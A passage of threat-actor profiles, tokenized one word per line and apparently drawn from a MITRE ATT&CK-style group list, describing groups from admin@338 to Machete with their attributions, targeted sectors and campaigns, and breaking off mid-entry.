admin@338
is
a
China-based
cyber
threat
group
.
 
It
has
previously
used
newsworthy
events
as
lures
to
deliver
malware
and
has
primarily
targeted
organizations
involved
in
financial
,
economic
,
and
trade
policy
,
typically
using
publicly
available
RATs
such
as
PoisonIvy
,
as
well
as
some
non-public
backdoors
.
 
Ajax
Security
Team
is
a
group
that
has
been
active
since
at
least
2010
and
believed
to
be
operating
out
of
Iran
.
 
By
2014
Ajax
Security
Team
transitioned
from
website
defacement
operations
to
malware-based
cyber
espionage
campaigns
targeting
the
US
defense
industrial
base
and
Iranian
users
of
anti-censorship
technologies
.
 
ALLANITE
is
a
suspected
Russian
cyber
espionage
group
,
that
has
primarily
targeted
the
electric
utility
sector
within
the
United
States
and
United
Kingdom
.
 
The
group's
tactics
and
techniques
are
reportedly
similar
to
Dragonfly
,
although
ALLANITEs
technical
capabilities
have
not
exhibited
disruptive
or
destructive
abilities
.
 
It
has
been
suggested
that
the
group
maintains
a
presence
in
ICS
for
the
purpose
of
gaining
understanding
of
processes
and
to
maintain
persistence
.
 
Andariel
is
a
North
Korean
state-sponsored
threat
group
that
has
been
active
since
at
least
2009
.
 
Andariel
has
primarily
focused
its
operations--which
have
included
destructive
attacks--against
South
Korean
government
agencies
,
military
organizations
,
and
a
variety
of
domestic
companies
;
they
have
also
conducted
cyber
financial
operations
against
ATMs
,
banks
,
and
cryptocurrency
exchanges
.
 
Andariel's
notable
activity
includes
Operation
Black
Mine
,
Operation
GoldenAxe
,
and
Campaign
Rifle
.
 
Andariel
is
considered
a
sub-set
of
Lazarus
Group
,
and
has
been
attributed
to
North
Korea's
Reconnaissance
General
Bureau
.
 
North
Korean
group
definitions
are
known
to
have
significant
overlap
,
and
some
security
researchers
report
all
North
Korean
state-sponsored
cyber
activity
under
the
name
Lazarus
Group
instead
of
tracking
clusters
or
subgroups
.
 
Aoqin
Dragon
is
a
suspected
Chinese
cyber
espionage
threat
group
that
has
been
active
since
at
least
2013
.
 
Aoqin
Dragon
has
primarily
targeted
government
,
education
,
and
telecommunication
organizations
in
Australia
,
Cambodia
,
Hong
Kong
,
Singapore
,
and
Vietnam
.
 
Security
researchers
noted
a
potential
association
between
Aoqin
Dragon
and
UNC94
,
based
on
malware
,
infrastructure
,
and
targets
.
 
APT-C-36
is
a
suspected
South
America
espionage
group
that
has
been
active
since
at
least
2018
.
 
The
group
mainly
targets
Colombian
government
institutions
as
well
as
important
corporations
in
the
financial
sector
,
petroleum
industry
,
and
professional
manufacturing
.
 
APT1
is
a
Chinese
threat
group
that
has
been
attributed
to
the
2nd
Bureau
of
the
Peoples
Liberation
Army
(PLA)
General
Staff
Departments
(GSD)
3rd
Department
,
commonly
known
by
its
Military
Unit
Cover
Designator
(MUCD)
as
Unit
61398
.
 
APT12
is
a
threat
group
that
has
been
attributed
to
China
.
 
The
group
has
targeted
a
variety
of
victims
including
but
not
limited
to
media
outlets
,
high-tech
companies
,
and
multiple
governments
.
 
APT16
is
a
China-based
threat
group
that
has
launched
spearphishing
campaigns
targeting
Japanese
and
Taiwanese
organizations
.
 
APT17
is
a
China-based
threat
group
that
has
conducted
network
intrusions
against
U
.
 
S
.
 
government
entities
,
the
defense
industry
,
law
firms
,
information
technology
companies
,
mining
companies
,
and
non-government
organizations
.
 
APT18
is
a
threat
group
that
has
operated
since
at
least
2009
and
has
targeted
a
range
of
industries
,
including
technology
,
manufacturing
,
human
rights
groups
,
government
,
and
medical
.
 
APT19
is
a
Chinese-based
threat
group
that
has
targeted
a
variety
of
industries
,
including
defense
,
finance
,
energy
,
pharmaceutical
,
telecommunications
,
high
tech
,
education
,
manufacturing
,
and
legal
services
.
 
In
2017
,
a
phishing
campaign
was
used
to
target
seven
law
and
investment
firms
.
 
Some
analysts
track
APT19
and
Deep
Panda
as
the
same
group
,
but
it
is
unclear
from
open
source
information
if
the
groups
are
the
same
.
 
APT28
is
a
threat
group
that
has
been
attributed
to
Russia's
General
Staff
Main
Intelligence
Directorate
(GRU)
85th
Main
Special
Service
Center
(GTsSS)
military
unit
26165
.
 
This
group
has
been
active
since
at
least
2004
.
 
APT28
reportedly
compromised
the
Hillary
Clinton
campaign
,
the
Democratic
National
Committee
,
and
the
Democratic
Congressional
Campaign
Committee
in
2016
in
an
attempt
to
interfere
with
the
U
.
 
S
.
 
presidential
election
.
 
In
2018
,
the
US
indicted
five
GRU
Unit
26165
officers
associated
with
APT28
for
cyber
operations
(including
close-access
operations)
conducted
between
2014
and
2018
against
the
World
Anti-Doping
Agency
(WADA),
the
US
Anti-Doping
Agency
,
a
US
nuclear
facility
,
the
Organization
for
the
Prohibition
of
Chemical
Weapons
(OPCW),
the
Spiez
Swiss
Chemicals
Laboratory
,
and
other
organizations
.
 
Some
of
these
were
conducted
with
the
assistance
of
GRU
Unit
74455
,
which
is
also
referred
to
as
Sandworm
Team
.
 
APT29
is
threat
group
that
has
been
attributed
to
Russia's
Foreign
Intelligence
Service
(SVR)
.
 
They
have
operated
since
at
least
2008
,
often
targeting
government
networks
in
Europe
and
NATO
member
countries
,
research
institutes
,
and
think
tanks
.
 
APT29
reportedly
compromised
the
Democratic
National
Committee
starting
in
the
summer
of
2015
.
 
In
April
2021
,
the
US
and
UK
governments
attributed
the
SolarWinds
Compromise
to
the
SVR
;
public
statements
included
citations
to
APT29
,
Cozy
Bear
,
and
The
Dukes
.
 
Industry
reporting
also
referred
to
the
actors
involved
in
this
campaign
as
UNC2452
,
NOBELIUM
,
StellarParticle
,
Dark
Halo
,
and
SolarStorm
.
 
APT3
is
a
China-based
threat
group
that
researchers
have
attributed
to
China's
Ministry
of
State
Security
.
 
This
group
is
responsible
for
the
campaigns
known
as
Operation
Clandestine
Fox
,
Operation
Clandestine
Wolf
,
and
Operation
Double
Tap
.
 
As
of
June
2015
,
the
group
appears
to
have
shifted
from
targeting
primarily
US
victims
to
primarily
political
organizations
in
Hong
Kong
.
 
In
2017
,
MITRE
developed
an
APT3
Adversary
Emulation
Plan
.
 
APT30
is
a
threat
group
suspected
to
be
associated
with
the
Chinese
government
.
 
While
Naikon
shares
some
characteristics
with
APT30
,
the
two
groups
do
not
appear
to
be
exact
matches
.
 
APT32
is
a
suspected
Vietnam-based
threat
group
that
has
been
active
since
at
least
2014
.
 
The
group
has
targeted
multiple
private
sector
industries
as
well
as
foreign
governments
,
dissidents
,
and
journalists
with
a
strong
focus
on
Southeast
Asian
countries
like
Vietnam
,
the
Philippines
,
Laos
,
and
Cambodia
.
 
They
have
extensively
used
strategic
web
compromises
to
compromise
victims
.
 
APT33
is
a
suspected
Iranian
threat
group
that
has
carried
out
operations
since
at
least
2013
.
 
The
group
has
targeted
organizations
across
multiple
industries
in
the
United
States
,
Saudi
Arabia
,
and
South
Korea
,
with
a
particular
interest
in
the
aviation
and
energy
sectors
.
 
APT37
is
a
North
Korean
state-sponsored
cyber
espionage
group
that
has
been
active
since
at
least
2012
.
 
The
group
has
targeted
victims
primarily
in
South
Korea
,
but
also
in
Japan
,
Vietnam
,
Russia
,
Nepal
,
China
,
India
,
Romania
,
Kuwait
,
and
other
parts
of
the
Middle
East
.
 
APT37
has
also
been
linked
to
the
following
campaigns
between
2016-2018:
Operation
Daybreak
,
Operation
Erebus
,
Golden
Time
,
Evil
New
Year
,
Are
you
Happy?,
FreeMilk
,
North
Korean
Human
Rights
,
and
Evil
New
Year
2018
.
 
North
Korean
group
definitions
are
known
to
have
significant
overlap
,
and
some
security
researchers
report
all
North
Korean
state-sponsored
cyber
activity
under
the
name
Lazarus
Group
instead
of
tracking
clusters
or
subgroups
.
 
APT38
is
a
North
Korean
state-sponsored
threat
group
that
specializes
in
financial
cyber
operations
;
it
has
been
attributed
to
the
Reconnaissance
General
Bureau
.
 
Active
since
at
least
2014
,
APT38
has
targeted
banks
,
financial
institutions
,
casinos
,
cryptocurrency
exchanges
,
SWIFT
system
endpoints
,
and
ATMs
in
at
least
38
countries
worldwide
.
 
Significant
operations
include
the
2016
Bank
of
Bangladesh
heist
,
during
which
APT38
stole
$81
million
,
as
well
as
attacks
against
Bancomext
(2018)
and
Banco
de
Chile
(2018);
some
of
their
attacks
have
been
destructive
.
 
North
Korean
group
definitions
are
known
to
have
significant
overlap
,
and
some
security
researchers
report
all
North
Korean
state-sponsored
cyber
activity
under
the
name
Lazarus
Group
instead
of
tracking
clusters
or
subgroups
.
 
APT39
is
one
of
several
names
for
cyber
espionage
activity
conducted
by
the
Iranian
Ministry
of
Intelligence
and
Security
(MOIS)
through
the
front
company
Rana
Intelligence
Computing
since
at
least
2014
.
 
APT39
has
primarily
targeted
the
travel
,
hospitality
,
academic
,
and
telecommunications
industries
in
Iran
and
across
Asia
,
Africa
,
Europe
,
and
North
America
to
track
individuals
and
entities
considered
to
be
a
threat
by
the
MOIS
.
 
APT41
is
a
threat
group
that
researchers
have
assessed
as
Chinese
state-sponsored
espionage
group
that
also
conducts
financially-motivated
operations
.
 
Active
since
at
least
2012
,
APT41
has
been
observed
targeting
healthcare
,
telecom
,
technology
,
and
video
game
industries
in
14
countries
.
 
APT41
overlaps
at
least
partially
with
public
reporting
on
groups
including
BARIUM
and
Winnti
Group
.
 
Aquatic
Panda
is
a
suspected
China-based
threat
group
with
a
dual
mission
of
intelligence
collection
and
industrial
espionage
.
 
Active
since
at
least
May
2020
,
Aquatic
Panda
has
primarily
targeted
entities
in
the
telecommunications
,
technology
,
and
government
sectors
.
 
Axiom
is
a
suspected
Chinese
cyber
espionage
group
that
has
targeted
the
aerospace
,
defense
,
government
,
manufacturing
,
and
media
sectors
since
at
least
2008
.
 
Some
reporting
suggests
a
degree
of
overlap
between
Axiom
and
Winnti
Group
but
the
two
groups
appear
to
be
distinct
based
on
differences
in
reporting
on
TTPs
and
targeting
.
 
BackdoorDiplomacy
is
a
cyber
espionage
threat
group
that
has
been
active
since
at
least
2017
.
 
BackdoorDiplomacy
has
targeted
Ministries
of
Foreign
Affairs
and
telecommunication
companies
in
Africa
,
Europe
,
the
Middle
East
,
and
Asia
.
 
BITTER
is
a
suspected
South
Asian
cyber
espionage
threat
group
that
has
been
active
since
at
least
2013
.
 
BITTER
has
primarily
targeted
government
,
energy
,
and
engineering
organizations
in
Pakistan
,
China
,
Bangladesh
,
and
Saudi
Arabia
.
 
BlackOasis
is
a
Middle
Eastern
threat
group
that
is
believed
to
be
a
customer
of
Gamma
Group
.
 
The
group
has
shown
interest
in
prominent
figures
in
the
United
Nations
,
as
well
as
opposition
bloggers
,
activists
,
regional
news
correspondents
,
and
think
tanks
.
 
A
group
known
by
Microsoft
as
NEODYMIUM
is
reportedly
associated
closely
with
BlackOasis
operations
,
but
evidence
that
the
group
names
are
aliases
has
not
been
identified
.
 
BlackTech
is
a
suspected
Chinese
cyber
espionage
group
that
has
primarily
targeted
organizations
in
East
Asia--particularly
Taiwan
,
Japan
,
and
Hong
Kong--and
the
US
since
at
least
2013
.
 
BlackTech
has
used
a
combination
of
custom
malware
,
dual-use
tools
,
and
living
off
the
land
tactics
to
compromise
media
,
construction
,
engineering
,
electronics
,
and
financial
company
networks
.
 
Blue
Mockingbird
is
a
cluster
of
observed
activity
involving
Monero
cryptocurrency-mining
payloads
in
dynamic-link
library
(DLL)
form
on
Windows
systems
.
 
The
earliest
observed
Blue
Mockingbird
tools
were
created
in
December
2019
.
 
Bouncing
Golf
is
a
cyberespionage
campaign
targeting
Middle
Eastern
countries
.
 
BRONZE
BUTLER
is
a
cyber
espionage
group
with
likely
Chinese
origins
that
has
been
active
since
at
least
2008
.
 
The
group
primarily
targets
Japanese
organizations
,
particularly
those
in
government
,
biotechnology
,
electronics
manufacturing
,
and
industrial
chemistry
.
 
Carbanak
is
a
cybercriminal
group
that
has
used
Carbanak
malware
to
target
financial
institutions
since
at
least
2013
.
 
Carbanak
may
be
linked
to
groups
tracked
separately
as
Cobalt
Group
and
FIN7
that
have
also
used
Carbanak
malware
.
 
Chimera
is
a
suspected
China-based
threat
group
that
has
been
active
since
at
least
2018
targeting
the
semiconductor
industry
in
Taiwan
as
well
as
data
from
the
airline
industry
.
 
Cleaver
is
a
threat
group
that
has
been
attributed
to
Iranian
actors
and
is
responsible
for
activity
tracked
as
Operation
Cleaver
.
 
Strong
circumstantial
evidence
suggests
Cleaver
is
linked
to
Threat
Group
2889
(TG-2889)
.
 
Cobalt
Group
is
a
financially
motivated
threat
group
that
has
primarily
targeted
financial
institutions
since
at
least
2016
.
 
The
group
has
conducted
intrusions
to
steal
money
via
targeting
ATM
systems
,
card
processing
,
payment
systems
and
SWIFT
systems
.
 
Cobalt
Group
has
mainly
targeted
banks
in
Eastern
Europe
,
Central
Asia
,
and
Southeast
Asia
.
 
One
of
the
alleged
leaders
was
arrested
in
Spain
in
early
2018
,
but
the
group
still
appears
to
be
active
.
 
The
group
has
been
known
to
target
organizations
in
order
to
use
their
access
to
then
compromise
additional
victims
.
 
Reporting
indicates
there
may
be
links
between
Cobalt
Group
and
both
the
malware
Carbanak
and
the
group
Carbanak
.
 
Confucius
is
a
cyber
espionage
group
that
has
primarily
targeted
military
personnel
,
high-profile
personalities
,
business
persons
,
and
government
organizations
in
South
Asia
since
at
least
2013
.
 
Security
researchers
have
noted
similarities
between
Confucius
and
Patchwork
,
particularly
in
their
respective
custom
malware
code
and
targets
.
 
CopyKittens
is
an
Iranian
cyber
espionage
group
that
has
been
operating
since
at
least
2013
.
 
It
has
targeted
countries
including
Israel
,
Saudi
Arabia
,
Turkey
,
the
U
.
 
S
.
 
,
Jordan
,
and
Germany
.
 
The
group
is
responsible
for
the
campaign
known
as
Operation
Wilted
Tulip
.
 
CURIUM
is
an
Iranian
threat
group
first
reported
in
November
2021
that
has
invested
in
building
a
relationship
with
potential
targets
via
social
media
over
a
period
of
months
to
establish
trust
and
confidence
before
sending
malware
.
 
Security
researchers
note
CURIUM
has
demonstrated
great
patience
and
persistence
by
chatting
with
potential
targets
daily
and
sending
benign
files
to
help
lower
their
security
consciousness
.
 
Dark
Caracal
is
threat
group
that
has
been
attributed
to
the
Lebanese
General
Directorate
of
General
Security
(GDGS)
and
has
operated
since
at
least
2012
.
 
Darkhotel
is
a
suspected
South
Korean
threat
group
that
has
targeted
victims
primarily
in
East
Asia
since
at
least
2004
.
 
The
group's
name
is
based
on
cyber
espionage
operations
conducted
via
hotel
Internet
networks
against
traveling
executives
and
other
select
guests
.
 
Darkhotel
has
also
conducted
spearphishing
campaigns
and
infected
victims
through
peer-to-peer
and
file
sharing
networks
.
 
DarkHydrus
is
a
threat
group
that
has
targeted
government
agencies
and
educational
institutions
in
the
Middle
East
since
at
least
2016
.
 
The
group
heavily
leverages
open-source
tools
and
custom
payloads
for
carrying
out
attacks
.
 
DarkVishnya
is
a
financially
motivated
threat
actor
targeting
financial
institutions
in
Eastern
Europe
.
 
In
2017-2018
the
group
attacked
at
least
8
banks
in
this
region
.
 
Deep
Panda
is
a
suspected
Chinese
threat
group
known
to
target
many
industries
,
including
government
,
defense
,
financial
,
and
telecommunications
.
 
The
intrusion
into
healthcare
company
Anthem
has
been
attributed
to
Deep
Panda
.
 
This
group
is
also
known
as
Shell
Crew
,
WebMasters
,
KungFu
Kittens
,
and
PinkPanther
.
 
Deep
Panda
also
appears
to
be
known
as
Black
Vine
based
on
the
attribution
of
both
group
names
to
the
Anthem
intrusion
.
 
Some
analysts
track
Deep
Panda
and
APT19
as
the
same
group
,
but
it
is
unclear
from
open
source
information
if
the
groups
are
the
same
.
 
Dragonfly
is
a
cyber
espionage
group
that
has
been
attributed
to
Russia's
Federal
Security
Service
(FSB)
Center
16
.
 
Active
since
at
least
2010
,
Dragonfly
has
targeted
defense
and
aviation
companies
,
government
entities
,
companies
related
to
industrial
control
systems
,
and
critical
infrastructure
sectors
worldwide
through
supply
chain
,
spearphishing
,
and
drive-by
compromise
attacks
.
 
DragonOK
is
a
threat
group
that
has
targeted
Japanese
organizations
with
phishing
emails
.
 
Due
to
overlapping
TTPs
,
including
similar
custom
tools
,
DragonOK
is
thought
to
have
a
direct
or
indirect
relationship
with
the
threat
group
Moafee
.
 
It
is
known
to
use
a
variety
of
malware
,
including
Sysget/HelloBridge
,
PlugX
,
PoisonIvy
,
FormerFirstRat
,
NFlog
,
and
NewCT
.
 
Earth
Lusca
is
a
suspected
China-based
cyber
espionage
group
that
has
been
active
since
at
least
April
2019
.
 
Earth
Lusca
has
targeted
organizations
in
Australia
,
China
,
Hong
Kong
,
Mongolia
,
Nepal
,
the
Philippines
,
Taiwan
,
Thailand
,
Vietnam
,
the
United
Arab
Emirates
,
Nigeria
,
Germany
,
France
,
and
the
United
States
.
 
Targets
included
government
institutions
,
news
media
outlets
,
gambling
companies
,
educational
institutions
,
COVID-19
research
organizations
,
telecommunications
companies
,
religious
movements
banned
in
China
,
and
cryptocurrency
trading
platforms
;
security
researchers
assess
some
Earth
Lusca
operations
may
be
financially
motivated
.
 
Earth
Lusca
has
used
malware
commonly
used
by
other
Chinese
threat
groups
,
including
APT41
and
the
Winnti
Group
cluster
,
however
security
researchers
assess
Earth
Lusca's
techniques
and
infrastructure
are
separate
.
 
Elderwood
is
a
suspected
Chinese
cyber
espionage
group
that
was
reportedly
responsible
for
the
2009
Google
intrusion
known
as
Operation
Aurora
.
 
The
group
has
targeted
defense
organizations
,
supply
chain
manufacturers
,
human
rights
and
nongovernmental
organizations
(NGOs),
and
IT
service
providers
.
 
Ember
Bear
is
a
suspected
Russian
state-sponsored
cyber
espionage
group
that
has
been
active
since
at
least
March
2021
.
 
Ember
Bear
has
primarily
focused
their
operations
against
Ukraine
and
Georgia
,
but
has
also
targeted
Western
European
and
North
American
foreign
ministries
,
pharmaceutical
companies
,
and
financial
sector
organizations
.
 
Security
researchers
assess
Ember
Bear
likely
conducted
the
WhisperGate
destructive
wiper
attacks
against
Ukraine
in
early
2022
.
 
Equation
is
a
sophisticated
threat
group
that
employs
multiple
remote
access
tools
.
 
The
group
is
known
to
use
zero-day
exploits
and
has
developed
the
capability
to
overwrite
the
firmware
of
hard
disk
drives
.
 
Evilnum
is
a
financially
motivated
threat
group
that
has
been
active
since
at
least
2018
.
 
EXOTIC
LILY
is
a
financially
motivated
group
that
has
been
closely
linked
with
Wizard
Spider
and
the
deployment
of
ransomware
including
Conti
and
Diavol
.
 
EXOTIC
LILY
may
be
acting
as
an
initial
access
broker
for
other
malicious
actors
,
and
has
targeted
a
wide
range
of
industries
including
IT
,
cybersecurity
,
and
healthcare
since
at
least
September
2021
.
 
Ferocious
Kitten
is
a
threat
group
that
has
primarily
targeted
Persian-speaking
individuals
in
Iran
since
at
least
2015
.
 
FIN10
is
a
financially
motivated
threat
group
that
has
targeted
organizations
in
North
America
since
at
least
2013
through
2016
.
 
The
group
uses
stolen
data
exfiltrated
from
victims
to
extort
organizations
.
 
FIN13
is
a
financially
motivated
cyber
threat
group
that
has
targeted
the
financial
,
retail
,
and
hospitality
industries
in
Mexico
and
Latin
America
,
as
early
as
2016
.
 
FIN13
achieves
its
objectives
by
stealing
intellectual
property
,
financial
data
,
mergers
and
acquisition
information
,
or
PII
.
 
FIN4
is
a
financially-motivated
threat
group
that
has
targeted
confidential
information
related
to
the
public
financial
market
,
particularly
regarding
healthcare
and
pharmaceutical
companies
,
since
at
least
2013
.
 
FIN4
is
unique
in
that
they
do
not
infect
victims
with
typical
persistent
malware
,
but
rather
they
focus
on
capturing
credentials
authorized
to
access
email
and
other
non-public
correspondence
.
 
FIN5
is
a
financially
motivated
threat
group
that
has
targeted
personally
identifiable
information
and
payment
card
information
.
 
The
group
has
been
active
since
at
least
2008
and
has
targeted
the
restaurant
,
gaming
,
and
hotel
industries
.
 
The
group
is
made
up
of
actors
who
likely
speak
Russian
.
 
FIN6
is
a
cyber
crime
group
that
has
stolen
payment
card
data
and
sold
it
for
profit
on
underground
marketplaces
.
 
This
group
has
aggressively
targeted
and
compromised
point
of
sale
(PoS)
systems
in
the
hospitality
and
retail
sectors
.
 
FIN7
is
a
financially-motivated
threat
group
that
has
been
active
since
2013
.
 
FIN7
has
primarily
targeted
the
retail
,
restaurant
,
hospitality
,
software
,
consulting
,
financial
services
,
medical
equipment
,
cloud
services
,
media
,
food
and
beverage
,
transportation
,
and
utilities
industries
in
the
U
.
 
S
.
 
A
portion
of
FIN7
was
run
out
of
a
front
company
called
Combi
Security
and
often
used
point-of-sale
malware
for
targeting
efforts
.
 
Since
2020
,
FIN7
shifted
operations
to
a
big
game
hunting
(BGH)
approach
including
use
of
REvil
ransomware
and
their
own
Ransomware
as
a
Service
(RaaS),
Darkside
.
 
FIN7
may
be
linked
to
the
Carbanak
Group
,
but
there
appears
to
be
several
groups
using
Carbanak
malware
and
are
therefore
tracked
separately
.
 
FIN8
is
a
financially
motivated
threat
group
that
has
been
active
since
at
least
January
2016
,
and
known
for
targeting
organizations
in
the
hospitality
,
retail
,
entertainment
,
insurance
,
technology
,
chemical
,
and
financial
sectors
.
 
In
June
2021
,
security
researchers
detected
FIN8
switching
from
targeting
point-of-sale
(POS)
devices
to
distributing
a
number
of
ransomware
variants
.
 
Fox
Kitten
is
threat
actor
with
a
suspected
nexus
to
the
Iranian
government
that
has
been
active
since
at
least
2017
against
entities
in
the
Middle
East
,
North
Africa
,
Europe
,
Australia
,
and
North
America
.
 
Fox
Kitten
has
targeted
multiple
industrial
verticals
including
oil
and
gas
,
technology
,
government
,
defense
,
healthcare
,
manufacturing
,
and
engineering
.
 
GALLIUM
is
a
cyberespionage
group
that
has
been
active
since
at
least
2012
,
primarily
targeting
telecommunications
companies
,
financial
institutions
,
and
government
entities
in
Afghanistan
,
Australia
,
Belgium
,
Cambodia
,
Malaysia
,
Mozambique
,
the
Philippines
,
Russia
,
and
Vietnam
.
 
Security
researchers
have
identified
GALLIUM
as
a
likely
Chinese
state-sponsored
group
,
based
in
part
on
tools
used
and
TTPs
commonly
associated
with
Chinese
threat
actors
.
 
Gallmaker
is
a
cyberespionage
group
that
has
targeted
victims
in
the
Middle
East
and
has
been
active
since
at
least
December
2017
.
 
The
group
has
mainly
targeted
victims
in
the
defense
,
military
,
and
government
sectors
.
 
Gamaredon
Group
is
a
suspected
Russian
cyber
espionage
threat
group
that
has
targeted
military
,
NGO
,
judiciary
,
law
enforcement
,
and
non-profit
organizations
in
Ukraine
since
at
least
2013
.
 
The
name
Gamaredon
Group
comes
from
a
misspelling
of
the
word
"Armageddon",
which
was
detected
in
the
adversary's
early
campaigns
.
 
In
November
2021
,
the
Ukrainian
government
publicly
attributed
Gamaredon
Group
to
Russia's
Federal
Security
Service
(FSB)
Center
18
.
 
GCMAN
is
a
threat
group
that
focuses
on
targeting
banks
for
the
purpose
of
transferring
money
to
e-currency
services
.
 
GOLD
SOUTHFIELD
is
a
financially
motivated
threat
group
active
since
at
least
2018
that
operates
the
REvil
Ransomware-as-a
Service
(RaaS)
.
 
GOLD
SOUTHFIELD
provides
backend
infrastructure
for
affiliates
recruited
on
underground
forums
to
perpetrate
high
value
deployments
.
 
By
early
2020
,
GOLD
SOUTHFIELD
started
capitalizing
on
the
new
trend
of
stealing
data
and
further
extorting
the
victim
to
pay
for
their
data
to
not
get
publicly
leaked
.
 
Gorgon
Group
is
a
threat
group
consisting
of
members
who
are
suspected
to
be
Pakistan-based
or
have
other
connections
to
Pakistan
.
 
The
group
has
performed
a
mix
of
criminal
and
targeted
attacks
,
including
campaigns
against
government
organizations
in
the
United
Kingdom
,
Spain
,
Russia
,
and
the
United
States
.
 
Group5
is
a
threat
group
with
a
suspected
Iranian
nexus
,
though
this
attribution
is
not
definite
.
 
The
group
has
targeted
individuals
connected
to
the
Syrian
opposition
via
spearphishing
and
watering
holes
,
normally
using
Syrian
and
Iranian
themes
.
 
Group5
has
used
two
commonly
available
remote
access
tools
(RATs),
njRAT
and
NanoCore
,
as
well
as
an
Android
RAT
,
DroidJack
.
 
HAFNIUM
is
a
likely
state-sponsored
cyber
espionage
group
operating
out
of
China
that
has
been
active
since
at
least
January
2021
.
 
HAFNIUM
primarily
targets
entities
in
the
US
across
a
number
of
industry
sectors
,
including
infectious
disease
researchers
,
law
firms
,
higher
education
institutions
,
defense
contractors
,
policy
think
tanks
,
and
NGOs
.
 
HEXANE
is
a
cyber
espionage
threat
group
that
has
targeted
oil
&
gas
,
telecommunications
,
aviation
,
and
internet
service
provider
organizations
since
at
least
2017
.
 
Targeted
companies
have
been
located
in
the
Middle
East
and
Africa
,
including
Israel
,
Saudi
Arabia
,
Kuwait
,
Morocco
,
and
Tunisia
.
 
HEXANE's
TTPs
appear
similar
to
APT33
and
OilRig
but
due
to
differences
in
victims
and
tools
it
is
tracked
as
a
separate
entity
.
 
Higaisa
is
a
threat
group
suspected
to
have
South
Korean
origins
.
 
Higaisa
has
targeted
government
,
public
,
and
trade
organizations
in
North
Korea
;
however
,
they
have
also
carried
out
attacks
in
China
,
Japan
,
Russia
,
Poland
,
and
other
nations
.
 
Higaisa
was
first
disclosed
in
early
2019
but
is
assessed
to
have
operated
as
early
as
2009
.
 
Inception
is
a
cyber
espionage
group
active
since
at
least
2014
.
 
The
group
has
targeted
multiple
industries
and
governmental
entities
primarily
in
Russia
,
but
has
also
been
active
in
the
United
States
and
throughout
Europe
,
Asia
,
Africa
,
and
the
Middle
East
.
 
IndigoZebra
is
a
suspected
Chinese
cyber
espionage
group
that
has
been
targeting
Central
Asian
governments
since
at
least
2014
.
 
Indrik
Spider
is
a
Russia-based
cybercriminal
group
that
has
been
active
since
at
least
2014
.
 
Indrik
Spider
initially
started
with
the
Dridex
banking
Trojan
,
and
then
by
2017
they
began
running
ransomware
operations
using
BitPaymer
,
WastedLocker
,
and
Hades
ransomware
.
 
Following
U
.
 
S
.
 
sanctions
and
an
indictment
in
2019
,
Indrik
Spider
changed
their
tactics
and
diversified
their
toolset
.
 
Ke3chang
is
a
threat
group
attributed
to
actors
operating
out
of
China
.
 
Ke3chang
has
targeted
oil
,
government
,
diplomatic
,
military
,
and
NGOs
in
Central
and
South
America
,
the
Caribbean
,
Europe
,
and
North
America
since
at
least
2010
.
 
Kimsuky
is
a
North
Korea-based
cyber
espionage
group
that
has
been
active
since
at
least
2012
.
 
The
group
initially
focused
on
targeting
South
Korean
government
entities
,
think
tanks
,
and
individuals
identified
as
experts
in
various
fields
,
and
expanded
its
operations
to
include
the
United
States
,
Russia
,
Europe
,
and
the
UN
.
 
Kimsuky
has
focused
its
intelligence
collection
activities
on
foreign
policy
and
national
security
issues
related
to
the
Korean
peninsula
,
nuclear
policy
,
and
sanctions
.
 
Kimsuky
was
assessed
to
be
responsible
for
the
2014
Korea
Hydro
&
Nuclear
Power
Co
.
 
compromise
;
other
notable
campaigns
include
Operation
STOLEN
PENCIL
(2018),
Operation
Kabar
Cobra
(2019),
and
Operation
Smoke
Screen
(2019)
.
 
North
Korean
group
definitions
are
known
to
have
significant
overlap
,
and
some
security
researchers
report
all
North
Korean
state-sponsored
cyber
activity
under
the
name
Lazarus
Group
instead
of
tracking
clusters
or
subgroups
.
 
LAPSUS$
is
cyber
criminal
threat
group
that
has
been
active
since
at
least
mid-2021
.
 
LAPSUS$
specializes
in
large-scale
social
engineering
and
extortion
operations
,
including
destructive
attacks
without
the
use
of
ransomware
.
 
The
group
has
targeted
organizations
globally
,
including
in
the
government
,
manufacturing
,
higher
education
,
energy
,
healthcare
,
technology
,
telecommunications
,
and
media
sectors
.
 
Lazarus
Group
is
a
North
Korean
state-sponsored
cyber
threat
group
that
has
been
attributed
to
the
Reconnaissance
General
Bureau
.
 
The
group
has
been
active
since
at
least
2009
and
was
reportedly
responsible
for
the
November
2014
destructive
wiper
attack
against
Sony
Pictures
Entertainment
as
part
of
a
campaign
named
Operation
Blockbuster
by
Novetta
.
 
Malware
used
by
Lazarus
Group
correlates
to
other
reported
campaigns
,
including
Operation
Flame
,
Operation
1Mission
,
Operation
Troy
,
DarkSeoul
,
and
Ten
Days
of
Rain
.
 
North
Korean
group
definitions
are
known
to
have
significant
overlap
,
and
some
security
researchers
report
all
North
Korean
state-sponsored
cyber
activity
under
the
name
Lazarus
Group
instead
of
tracking
clusters
or
subgroups
,
such
as
Andariel
,
APT37
,
APT38
,
and
Kimsuky
.
 
LazyScripter
is
threat
group
that
has
mainly
targeted
the
airlines
industry
since
at
least
2018
,
primarily
using
open-source
toolsets
.
 
Leafminer
is
an
Iranian
threat
group
that
has
targeted
government
organizations
and
business
entities
in
the
Middle
East
since
at
least
early
2017
.
 
Leviathan
is
a
Chinese
state-sponsored
cyber
espionage
group
that
has
been
attributed
to
the
Ministry
of
State
Security's
(MSS)
Hainan
State
Security
Department
and
an
affiliated
front
company
.
 
Active
since
at
least
2009
,
Leviathan
has
targeted
the
following
sectors:
academia
,
aerospace/aviation
,
biomedical
,
defense
industrial
base
,
government
,
healthcare
,
manufacturing
,
maritime
,
and
transportation
across
the
US
,
Canada
,
Europe
,
the
Middle
East
,
and
Southeast
Asia
.
 
Lotus
Blossom
is
a
threat
group
that
has
targeted
government
and
military
organizations
in
Southeast
Asia
.
 
LuminousMoth
is
a
Chinese-speaking
cyber
espionage
group
that
has
been
active
since
at
least
October
2020
.
 
LuminousMoth
has
targeted
high-profile
organizations
,
including
government
entities
,
in
Myanmar
,
the
Philippines
,
Thailand
,
and
other
parts
of
Southeast
Asia
.
 
Some
security
researchers
have
concluded
there
is
a
connection
between
LuminousMoth
and
Mustang
Panda
based
on
similar
targeting
and
TTPs
,
as
well
as
network
infrastructure
overlaps
.
 
Machete
is
a
suspected
Spanish-speaking
cyber
espionage
group
that
has
been
active
since
at
least
2010
.
 
It
has
primarily
focused
its
operations
within
Latin
America
,
with
a
particular
emphasis
on
Venezuela
,
but
also
in
the
US
,
Europe
,
Russia
,
and
parts
of
Asia
.
 
Machete
generally
targets
high-profile
organizations
such
as
government
institutions
,
intelligence
services
